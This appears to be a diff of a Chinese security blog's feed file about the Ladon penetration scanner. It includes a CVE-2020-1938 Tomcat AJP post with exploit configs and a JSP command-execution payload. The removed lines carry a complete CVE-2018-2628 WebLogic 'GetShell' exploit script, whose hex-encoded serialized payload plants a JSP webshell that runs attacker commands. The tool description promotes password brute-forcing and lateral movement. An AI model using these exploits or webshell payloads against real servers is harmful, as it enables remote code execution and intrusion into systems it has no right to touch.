@@ -103,7 +103,7 @@
 <h3 id="成品下载"><a href="#成品下载" class="headerlink" title="成品下载"></a>成品下载</h3><p><a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>Win7/2008或安装.net 2.x 3.x系统可使用Ladon.exe<br>Win8-win10或安装.net 4.x系统可使用Ladon40.exe</p>
 <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>无论内网还是外网渗透信息收集都是非常关键，信息收集越多越准确渗透的成功率就越高。<br>但成功率还受到漏洞影响，漏洞受时效性影响，对于大型内网扫描速度直接影响着成功率。<br>漏洞时效性1-2天，扫描内网或外网需1周时间，是否会因此错过很多或许可成功的漏洞？<br>对于那些拥有几百上千域名的大站来说，你发现越快成功率就越高，慢管理员就打补丁了。<br>因此我们需要一个支持批量C段/B段甚至A段的扫描器，添加自定义模块快速检测新出漏洞。</p>
 <h3 id="关于Ladon"><a href="#关于Ladon" class="headerlink" title="关于Ladon"></a>关于Ladon</h3><p>Ladon音译: 拉登或拉冬。因集成了很多模块，每个模块又可独立成为一个工具，和百头巨龙有很多头类似。<br>Ladon是希腊神话中的神兽，看守金苹果的百头巨龙。它从不睡觉，被赫拉克勒斯借扛天巨人之手诱巨龙睡着<br>杀死巨龙并偷得了金苹果。巨龙死前将自己的魂魄封印在金苹果中，偷盗者将金苹果送给了白雪公主，公主<br>为了报恩将金苹果分给了七个小矮人，吃下以后他们变成了龙珠散落到世界各地，龙珠分为七颗，它蕴含着<br>可以令奇迹发生的力量。当集齐7颗龙珠念出咒语，就能召唤神龙，而神龙则会实现召唤者提出的一个愿望。</p>
-<h3 id="程序简介"><a href="#程序简介" class="headerlink" title="程序简介"></a>程序简介</h3><p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。6.5版本内置70个功能模块,外部模块17个,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、Weblogic、ActiveMQ、Tomcat、Struts2系列等，密码爆破12种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB/IPC、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、Weblogic、Rar等，远程执行命令包含(wmiexe/psexec/atexec/sshexec/jspshell),Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。</p>
+<h3 id="程序简介"><a href="#程序简介" class="headerlink" title="程序简介"></a>程序简介</h3><p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。6.5版本内置72个功能模块,外部模块17个,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、Weblogic、ActiveMQ、Tomcat、Struts2系列等，密码爆破12种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH、VNC、Windows(LDAP、SMB/IPC、WMI、SmbHash、WmiHash、Winrm)、BasicAuth、Tomcat、Weblogic、Rar等，远程执行命令包含(wmiexe/psexec/atexec/sshexec/jspshell),Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。</p>
 <h3 id="使用简单"><a href="#使用简单" class="headerlink" title="使用简单"></a>使用简单</h3><p>虽然Ladon功能丰富多样,但使用却非常简单,任何人都能轻易上手<br>只需一或两个参数就可用90%的功能,一个模块相当于一个新工具</p>
 <h3 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>Ladon.exe可在安装有.net 2.0及以上版本Win系统中使用(Win7后系统自带.net)<br>如Cmd、PowerShell、远控Cmd、WebShell等，以及Cobalt Strike内存加载使用<br>Ladon.ps1完美兼容win7-win10 PowerShell，不看版本可远程加载实现无文件渗透</p>
 <h4 id="Linux、Mac"><a href="#Linux、Mac" class="headerlink" title="Linux、Mac"></a>Linux、Mac</h4><p>安装Mono运行时,将KaliLodan改名为Ladon,通过mono执行Ladon即可。</p>
@@ -632,7 +632,7 @@
 <td>Ladon Runas user pass cmd</td>
 </tr>
 </tbody></table>
-<h4 id="0x012-其它功能-5"><a href="#0x012-其它功能-5" class="headerlink" title="0x012 其它功能(5)"></a>0x012 其它功能(5)</h4><table>
+<h4 id="0x012-其它功能-6"><a href="#0x012-其它功能-6" class="headerlink" title="0x012 其它功能(6)"></a>0x012 其它功能(6)</h4><table>
 <thead>
 <tr>
 <th>ID</th>
@@ -670,6 +670,18 @@
 <td><a href="http://k8gege.org/">WebSer</a></td>
 <td>迷你WEB服务器</td>
 <td>Ladon WebSer 80 或 Ladon web 80</td>
+</tr>
+<tr>
+<td>6</td>
+<td><a href="http://k8gege.org/">NetVer</a></td>
+<td>查看安装.NET版本</td>
+<td>Ladon NetVer 或 Ladon NetVersion</td>
+</tr>
+<tr>
+<td>6</td>
+<td><a href="http://k8gege.org/">PsVer</a></td>
+<td>查看PowerShell版本</td>
+<td>Ladon PsVer 或 Ladon PSVersion</td>
 </tr>
 </tbody></table>
 <p>注：以上仅是该工具内置模块的初级用法，外置插件或更高级用法请查看使用文档<br> 中级用法INI文件配置调用任意程序、系统命令、各种语言现成EXP的批量利用<br> 高级用法Exp生成器一键生成Poc，使用各种语言编写插件扩展Ladon扫描能力。</p>
@@ -2061,42 +2073,6 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
       </tags>
   </entry>
   <entry>
-    <title>Ladon CVE-2020-1938跨网段、C段批量扫描内网漏洞</title>
-    <url>/p/42879.html</url>
-    <content><![CDATA[<h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>根据国家信息安全漏洞共享平台（CNVD）20日发布的Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。</p>
-<h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><p>cnvd-2020-10487<br>cve-2020-1938</p>
-<h3 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h3><p>开放AJP端口（默认开放8009）</p>
-<h3 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>apache tomcat 6<br>apache tomcat 7 &lt; 7.0.100<br>apache tomcat 8 &lt; 8.5.51<br>apache tomcat 9 &lt; 9.0.31</p>
-<h3 id="扫描框架"><a href="#扫描框架" class="headerlink" title="扫描框架"></a>扫描框架</h3><p>Ladon设计的初衷就是一个多线程扫描框架，主要是为了让使用者能快速批量检测企业内部或外部站点漏洞<br>不管你擅长哪一门语言，只需要实现单一功能，都可以快速进行批量IP、批量URL、批量C段、批量B段等等<br>每当公开或泄露一个新漏洞时，自己要实现多现程以及批量以上功能，重写一份浪费时间，可能会错过时机<br>小内网可能自己写个批量IP.TXT就够用了，但是大的内网几百几千个网段就基本没有工具考虑，如批量C段<br>但是不要慌，无论是多线程，还是批量C段、跨网段等等，Ladon全都帮你考虑好了，只需实现单一功能即可<br>在Ladon的插件中配置INI方式是不需要具备编程能力的，只要会使用工具，即可实现批量调用，非常简单</p>
-<h3 id="Ladon配置"><a href="#Ladon配置" class="headerlink" title="Ladon配置"></a>Ladon配置</h3><p>INI配置很简单，只需要两个参数即可。Github上随便找一份EXP，以下我用的是PYTHON版。<br>两种配置方式，一种是编译成EXE丢到目标上运行的，一种是PY脚本方式执行方便本地调式</p>
-<h4 id="EXE配置"><a href="#EXE配置" class="headerlink" title="EXE配置"></a>EXE配置</h4><p>cve-2020-1938.ini</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=CVE-2020-1938.exe</span><br><span class="line">arg=-p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure>
-
-<h4 id="PY配置"><a href="#PY配置" class="headerlink" title="PY配置"></a>PY配置</h4><p>cve-2020-1938.ini</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=f:\python\python.exe</span><br><span class="line">arg=CVE-2020-1938.py -p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure>
-
-<h3 id="批量内网"><a href="#批量内网" class="headerlink" title="批量内网"></a>批量内网</h3><p>把开放8009端口的IP放进ip.txt，执行以下命令即可批量扫描<br>当然也可以不扫端口和不扫存活IP，直接ip24.txt扫描批量C段</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon cve-2020-1938.ini</span><br></pre></td></tr></table></figure>
-<p>以下为内网实战批量检测结果<br><img alt="img" data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2020-1938.png"></p>
-<h3 id="文件包含RCE"><a href="#文件包含RCE" class="headerlink" title="文件包含RCE"></a>文件包含RCE</h3><p>一定条件下可实现RCE，如有地方实现文件上传，往目标传个exec.jpg,内容如下，执行whoami</p>
-<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%out.println(<span class="keyword">new</span> java.io.BufferedReader(<span class="keyword">new</span> java.io.InputStreamReader(Runtime.getRuntime().exec(<span class="string">"whoami"</span>).getInputStream())).readLine());%&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python CVE-2020-1938.py -p 8009 -f exec.jpg 192.168.1.10 -c 1</span><br><span class="line">Getting resource at ajp13://192.168.1.10:8009/index.jsp</span><br><span class="line">----------------------------</span><br><span class="line">k82003-77562e10\administrator</span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="1-更新到安全版本"><a href="#1-更新到安全版本" class="headerlink" title="1.更新到安全版本"></a>1.更新到安全版本</h4><p>Apache Tomcat 7.0.100<br>Apache Tomcat 8.5.51<br>Apache Tomcat 9.0.31</p>
-<h4 id="2-关闭AJP服务"><a href="#2-关闭AJP服务" class="headerlink" title="2.关闭AJP服务"></a>2.关闭AJP服务</h4><p>修改Tomcat配置文件Service.xml,注释掉<br><connector port="8009" protocol="AJP/1.3" redirectport="8443"></connector></p>
-<h4 id="3、配置ajp配置"><a href="#3、配置ajp配置" class="headerlink" title="3、配置ajp配置"></a>3、配置ajp配置</h4><p>配置ajp配置中的secretRequired跟secret属性来限制认证</p>
-<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
-]]></content>
-      <categories>
-        <category>Ladon</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Ladon</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>看我如何模拟Cobalt Strike上线欺骗入侵者</title>
     <url>/p/40523.html</url>
     <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>不知道你有没有遇到过马上线却不能操作的情况，我猜当你网络卡或马写得不好时会出现这个问题<br>但是人为的你可能没遇到过，首先要欺骗你的远控，得分析你的协议，如果你的马根本不是公开的<br>网络又是好的，你刚往人家机器里种马，发现马只能上线不能操作，绝对是马有问题，不能甩锅我<br>人家都不知道你的马的通信原理，流量特征，不可能事先准备好一个程序，让你一发就欺骗你的马<br>本文主要研究CS这个APT很喜欢用的马，当然TCP的也一样原理，只要构造对应的数据包就可欺骗</p>
@@ -2133,6 +2109,42 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
       <tags>
         <tag>Cobalt Strike</tag>
         <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Ladon CVE-2020-1938跨网段、C段批量扫描内网漏洞</title>
+    <url>/p/42879.html</url>
+    <content><![CDATA[<h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>根据国家信息安全漏洞共享平台（CNVD）20日发布的Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。</p>
+<h3 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h3><p>cnvd-2020-10487<br>cve-2020-1938</p>
+<h3 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h3><p>开放AJP端口（默认开放8009）</p>
+<h3 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>apache tomcat 6<br>apache tomcat 7 &lt; 7.0.100<br>apache tomcat 8 &lt; 8.5.51<br>apache tomcat 9 &lt; 9.0.31</p>
+<h3 id="扫描框架"><a href="#扫描框架" class="headerlink" title="扫描框架"></a>扫描框架</h3><p>Ladon设计的初衷就是一个多线程扫描框架，主要是为了让使用者能快速批量检测企业内部或外部站点漏洞<br>不管你擅长哪一门语言，只需要实现单一功能，都可以快速进行批量IP、批量URL、批量C段、批量B段等等<br>每当公开或泄露一个新漏洞时，自己要实现多现程以及批量以上功能，重写一份浪费时间，可能会错过时机<br>小内网可能自己写个批量IP.TXT就够用了，但是大的内网几百几千个网段就基本没有工具考虑，如批量C段<br>但是不要慌，无论是多线程，还是批量C段、跨网段等等，Ladon全都帮你考虑好了，只需实现单一功能即可<br>在Ladon的插件中配置INI方式是不需要具备编程能力的，只要会使用工具，即可实现批量调用，非常简单</p>
+<h3 id="Ladon配置"><a href="#Ladon配置" class="headerlink" title="Ladon配置"></a>Ladon配置</h3><p>INI配置很简单，只需要两个参数即可。Github上随便找一份EXP，以下我用的是PYTHON版。<br>两种配置方式，一种是编译成EXE丢到目标上运行的，一种是PY脚本方式执行方便本地调式</p>
+<h4 id="EXE配置"><a href="#EXE配置" class="headerlink" title="EXE配置"></a>EXE配置</h4><p>cve-2020-1938.ini</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=CVE-2020-1938.exe</span><br><span class="line">arg=-p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure>
+
+<h4 id="PY配置"><a href="#PY配置" class="headerlink" title="PY配置"></a>PY配置</h4><p>cve-2020-1938.ini</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line">exe=f:\python\python.exe</span><br><span class="line">arg=CVE-2020-1938.py -p 8009 -f /WEB-INF/web.xml <span class="variable">$ip</span>$ -c 0</span><br></pre></td></tr></table></figure>
+
+<h3 id="批量内网"><a href="#批量内网" class="headerlink" title="批量内网"></a>批量内网</h3><p>把开放8009端口的IP放进ip.txt，执行以下命令即可批量扫描<br>当然也可以不扫端口和不扫存活IP，直接ip24.txt扫描批量C段</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon cve-2020-1938.ini</span><br></pre></td></tr></table></figure>
+<p>以下为内网实战批量检测结果<br><img alt="img" data-original="http://k8gege.org/k8img/Ladon/exp/CVE-2020-1938.png"></p>
+<h3 id="文件包含RCE"><a href="#文件包含RCE" class="headerlink" title="文件包含RCE"></a>文件包含RCE</h3><p>一定条件下可实现RCE，如有地方实现文件上传，往目标传个exec.jpg,内容如下，执行whoami</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%out.println(<span class="keyword">new</span> java.io.BufferedReader(<span class="keyword">new</span> java.io.InputStreamReader(Runtime.getRuntime().exec(<span class="string">"whoami"</span>).getInputStream())).readLine());%&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python CVE-2020-1938.py -p 8009 -f exec.jpg 192.168.1.10 -c 1</span><br><span class="line">Getting resource at ajp13://192.168.1.10:8009/index.jsp</span><br><span class="line">----------------------------</span><br><span class="line">k82003-77562e10\administrator</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="1-更新到安全版本"><a href="#1-更新到安全版本" class="headerlink" title="1.更新到安全版本"></a>1.更新到安全版本</h4><p>Apache Tomcat 7.0.100<br>Apache Tomcat 8.5.51<br>Apache Tomcat 9.0.31</p>
+<h4 id="2-关闭AJP服务"><a href="#2-关闭AJP服务" class="headerlink" title="2.关闭AJP服务"></a>2.关闭AJP服务</h4><p>修改Tomcat配置文件Service.xml,注释掉<br><connector port="8009" protocol="AJP/1.3" redirectport="8443"></connector></p>
+<h4 id="3、配置ajp配置"><a href="#3、配置ajp配置" class="headerlink" title="3、配置ajp配置"></a>3、配置ajp配置</h4><p>配置ajp配置中的secretRequired跟secret属性来限制认证</p>
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
+]]></content>
+      <categories>
+        <category>Ladon</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Ladon</tag>
       </tags>
   </entry>
   <entry>
@@ -2883,125 +2895,6 @@ WIN-OLDM1T2H9M4                     WIN-OLDM1T2H9M4          </code></pre>
       </tags>
   </entry>
   <entry>
-    <title>CVE-2018-2628 Weblogic GetShell Exploit</title>
-    <url>/p/b8e58f69.html</url>
-    <content><![CDATA[<h2 id="漏洞简介">漏洞简介</h2>
-<hr>
-<ul>
-<li>漏洞威胁：RCE--远程代码执行</li>
-<li>漏洞组件：weblogic</li>
-<li>影响版本：10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3</li>
-</ul>
-<h2 class="brush:python;gutter:true;"><br><strong>代码:</strong> </h2>
-<div class="cnblogs_Highlighter">
-<pre class="brush:python;gutter:true;"># -*- coding: utf-8 -*-
-# Oracle Weblogic Server (10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3) Deserialization Remote Command Execution Vulnerability (CVE-2018-2628)
-
-<p>from <strong>future</strong> import print_function</p>
-<p>import binascii<br>import os<br>import socket<br>import sys<br>import time</p>
-<p>def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):</p>
-<pre><code>#k8cmd weblogic http://192.11.22.67:7001/bea_wls_internal/wlscmd.jsp
-return &quot;aced00057372002f6f72672e6170616368652e636f6d6d6f6e732e66696c6575706c6f61642e6469736b2e4469736b46696c654974656d1f0d7226839a887103000a5a000b6973466f726d4669656c644a000473697a6549000d73697a655468726573686f6c645b000d636163686564436f6e74656e747400025b424c000b636f6e74656e74547970657400124c6a6176612f6c616e672f537472696e673b4c000864666f7346696c6574000e4c6a6176612f696f2f46696c653b4c00096669656c644e616d6571007e00024c000866696c654e616d6571007e00024c00076865616465727374002f4c6f72672f6170616368652f636f6d6d6f6e732f66696c6575706c6f61642f46696c654974656d486561646572733b4c000a7265706f7369746f727971007e0003787000ffffffffffffffff00000000757200025b42acf317f8060854e00200007870000002d43c25407061676520696d706f72743d226a6176612e696f2e2a22253e0d0a3c25407061676520696d706f72743d2273756e2e6d6973632e4241534536344465636f64657222253e0d0a3c250d0a747279207b0d0a537472696e6720636d64203d20726571756573742e676574506172616d657465722822746f6d22293b0d0a537472696e6720706174683d6170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574526571756573745552492829293b0d0a537472696e67206469723d227765626c6f676963223b0d0a696628636d642e657175616c7328224e7a55314e672229297b6f75742e7072696e7428225b535d222b6469722b225b455d22293b7d0d0a627974655b5d2062696e617279203d204241534536344465636f6465722e636c6173732e6e6577496e7374616e636528292e6465636f646542756666657228636d64293b0d0a537472696e67206b636d64203d206e657720537472696e672862696e617279293b0d0a50726f63657373206368696c64203d2052756e74696d652e67657452756e74696d6528292e65786563286b636d64293b0d0a496e70757453747265616d20696e203d206368696c642e676574496e70757453747265616d28293b0d0a6f75742e7072696e7428222d3e7c22293b0d0a696e7420633b0d0a7768696c6520282863203d20696e2e7265616428292920213d202d3129207b0d0a6f75742e7072696e742828636861722963293b0d0a7d0d0a696e2e636c6f736528293b0d0a6f75742e7072696e7428227c3c2d22293b0d0a747279207b0d0a6368696c642e77616974466f7228293b0d0a7d2063617463682028496e746572727570746564457863657074696f6e206529207b0d0a652e7072696e74537461636b547261636528293b0d0a7d0d0a7d2063617463682028494f457863657074696f6e206529207b0d0a53797374656d2e6572722e7072696e746c6e2865293b0d0a7d0d0a253e7400186170706c69636174696f6e2f6f637465742d73747265616d707400047465737471007e0009707372000c6a6176612e696f2e46696c65042da4450e0de4ff0300014c00047061746871007e0002787074004d736572766572735c41646d696e5365727665725c746d705c5f574c5f696e7465726e616c5c6265615f776c735f696e7465726e616c5c396a3464716b5c7761725c776c73636d642e6a7370c0807702005c7878&quot;</code></pre><p>def t3_handshake(sock, server_addr):<br>    sock.connect(server_addr)<br>    sock.send(‘74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a’.decode(‘hex’))<br>    time.sleep(1)<br>    sock.recv(1024)<br>    print(‘handshake successful’)</p>
-<p>def build_t3_request_object(sock, port):<br>    data1 = ‘000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371’<br>    data2 = ‘007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07’.format(‘{:04x}’.format(dport))<br>    data3 = ‘1a7727000d3234322e323134’<br>    data4 = ‘2e312e32353461863d1d0000000078’<br>    for d in [data1,data2,data3,data4]:<br>        sock.send(d.decode(‘hex’))<br>    time.sleep(2)<br>    print(‘send request payload successful,recv length:%d’%(len(sock.recv(2048))))</p>
-<p>def send_payload_objdata(sock, data):<br>    payload=’056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000’<br>    payload+=data<br>    payload+=’fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff’<br>    payload = ‘%s%s’%(‘{:08x}’.format(len(payload)/2 + 4),payload)<br>    sock.send(payload.decode(‘hex’))<br>    time.sleep(2)<br>    sock.send(payload.decode(‘hex’))<br>    res = ‘’<br>    try:<br>        while True:<br>            res += sock.recv(4096)<br>            time.sleep(0.1)<br>    except Exception:<br>        pass<br>    return res</p>
-<p>def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):<br>    print(‘——————————————–’)<br>    print(‘Weblogic GetShell Exploit for CVE-2018-2628’)<br>    print(‘by k8gege build 20180426’)<br>    print(‘——————————————–’)<br>    print(“sending payload”);<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.settimeout(8)<br>    server_addr = (dip, dport)<br>    t3_handshake(sock, server_addr)<br>    build_t3_request_object(sock, dport)<br>    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</p>
-<pre><code>rs=send_payload_objdata(sock, payload)
-#print(&apos;response: &apos; + rs)
-print(&apos;exploit completed!&apos;)
-print(&apos;shell: http://&apos;+dip+&apos;:&apos;+str(dport)+&quot;/bea_wls_internal/wlscmd.jsp&quot;)
-print(&apos;Please use the k8fly connection shell&apos;)</code></pre><p>if <strong>name</strong>==”<strong>main</strong>“:<br>    if len(sys.argv) != 3:<br>        print(‘——————————————–’)<br>        print(‘Weblogic GetShell Exploit for CVE-2018-2628’)<br>        print(‘by k8gege build 20180426’)<br>        print(‘Usage: exploit [weblogic ip] [weblogic port]’)<br>        print(‘——————————————–’)<br>        sys.exit()</p>
-<pre><code>dip = sys.argv[1]
-dport = int(sys.argv[2])
-exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</code></pre><p></p></pre><p></p>
-</div>
-<h2>&nbsp;演示:</h2>
-<p><img alt data-original="http://k8gege.org/k8img/posts/cve-2018-2628.png"></p>
-<h2>附件说明:</h2>
-<p><strong>0x001 .net版</strong><br>exp功能<br>1 探测weblogic版本<br>2 GetShell<br><br>运行环境 .net 2.0<br><br><strong>0x002 python版</strong><br>Exp-2018-2628.exe 附python代码<br>Poc-2018-2628.exe 仅检测是否存在漏洞</p>
-<p>链接: <a href="https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar" target="_blank">https://github.com/k8gege/K8tools/raw/master/ColdFusion%208%20LFI%20EXP_20160414%5BK.8%5D.rar</a></p>
-<p>&nbsp;</p>]]></content>
-      <categories>
-        <category>Exp</category>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>Weblogic</tag>
-        <tag>GetShell</tag>
-      </tags>
